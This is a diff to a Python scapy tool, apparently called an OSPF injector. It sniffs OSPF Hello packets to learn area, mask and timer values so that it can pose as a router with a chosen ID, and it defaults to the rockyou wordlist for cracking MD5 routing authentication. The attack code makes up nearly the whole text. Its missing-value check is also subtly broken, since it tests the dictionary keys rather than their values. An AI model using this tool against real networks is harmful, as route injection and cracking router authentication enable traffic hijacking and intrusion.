@@ -1,35 +1,32 @@
 import typing
 from scapy.contrib.ospf import OSPF_Hdr, OSPF_Hello
 from scapy.layers.inet import IP
-from scapy.layers.l2 import Ether
-from scapy.all import get_if_hwaddr, get_if_addr, sniff, sendp
+from scapy.all import get_if_hwaddr, get_if_addr, sniff
 import argparse
 from helper.helper import (
         OSPFSession,
         OSPFConfig,
         LOG,
-        ALL_SPF_ROUTERS,
-        ALL_SPF_ROUTERS_MAC,
-        OSPFType,
         )
 
+
+# FALLBACK if dict param not specified - easy to modify
+ROCKYOU = "/usr/share/wordlist/rockyou.txt"
 
 def main() -> None:
     parser = argparse.ArgumentParser()
     parser.add_argument("int", help="Network Interface Card to bind to (e.g. eth0)")
     parser.add_argument("router_id", help="Logical OSPF Router ID to assume (e.g. 10.10.10.10)")
-    parser.add_argument("--dict", default="passwords.txt", help="Path to dictionary file for MD5 hash cracking")
+    parser.add_argument("--dict", default=ROCKYOU, help="Path to dictionary file for MD5 hash cracking")
 
     args = parser.parse_args()
     LOG.info("[*] Initializing OSPF Injector...")
-
-    # TODO: UPGRADE TO USE ARGPARSE
     
     # Dynamically Retrieve OSPF fields
     src_ip = get_if_addr(args.int)
     src_mac = get_if_hwaddr(args.int)
 
-    # TODO: Can expand to extract all values here XDD
+    # TODO: Double check if any other details need to be dynamically extracted from here
     extract_details = {
             "area": None,
             "mask": None,
@@ -39,40 +36,48 @@ def main() -> None:
 
     def capture_ospf_details(pkt) -> bool:
         """Dynamically extract wanted values from sniffed OSPF packet"""
-        if pkt.hasLayer(OSPF_Hdr):
-            ospf_packet = pkt[OSPF_Hdr]
+        if IP not in pkt or OSPF_Hdr not in pkt or OSPF_Hello not in pkt:
+            return False
 
-            extract_details["area"] = getattr(ospf_packet, "area", "0.0.0.0")
-            
-            if pkt.hasLayer(OSPF_Hello):
-                hello = pkt[OSPF_Hello]
+        # Drop own sniffed packets
+        if pkt[IP].src == src_ip:
+            return False
 
-                # Default values based on OSPF_Hello class
-                extract_details["mask"] = getattr(hello, "mask", "255.255.255.0")
-                extract_details["hello_interval"] = getattr(hello, "hello_interval", 10)
-                extract_details["dead_interval"] = getattr(hello, "dead_interval", 40)
+        # Drop own OSPF packets
+        if str(pkt[OSPF_Hdr].src) == args.router_id:
+            return False
 
-                return True
-        return False
+        LOG.info("Captured OSPF Packet from %s", pkt[IP].src)
 
-    # Generic OSPF probing packet
-    probe_packet = (
-            Ether(src=src_mac, dst=ALL_SPF_ROUTERS_MAC) /
-            IP(src=src_ip, dst=ALL_SPF_ROUTERS) /
-            OSPF_Hdr(version=2, type=OSPFType.HELLO, src=args.router_id, area="0.0.0.0", authtype=0) /
-            OSPF_Hello(mask="255.255.255.0", hellointerval=10, options=0x02, prio=0, deadinterval=40)
-            )
+        ospf_packets = pkt[OSPF_Hdr]
+        hello = pkt[OSPF_Hello]
 
-    sendp(probe_packet, iface=args.int, verbose=False)
+        # Default values based on OSPF_Hello class
+        extract_details["area"] = str(ospf_packets.area)
+        extract_details["mask"] = str(hello.mask)
+        extract_details["hello_interval"] = int(hello.hellointerval)
+        extract_details["dead_interval"] = int(hello.deadinterval)
 
-    sniff(iface=args.int, filter="ip proto 89", stop_filter=capture_ospf_details, timeout=3)
+        return True
+
+    sniff(iface=args.int, filter="ip proto 89", stop_filter=capture_ospf_details, timeout=15)
+
+    # Hard checker for None values
+    missing = [key for key in extract_details.keys() if key is None]
+
+    if missing:
+        raise RuntimeError(
+                f"No usable OSPF Hello captured on {args.int}"
+                f"Missing: {missing}"
+                )
 
     # initialise config
     config = OSPFConfig(
             iface=args.int,
             router_id=args.router_id,
-            area=typing.cast(str, extract_details.get("area")),
             mask=typing.cast(str, extract_details.get("mask")),
+            int_ip=src_ip,
+            area=typing.cast(str, extract_details.get("area")),
             hello_interval=typing.cast(int, extract_details.get("hello_interval")),
             dead_interval=typing.cast(int, extract_details.get("dead_interval")),
             )
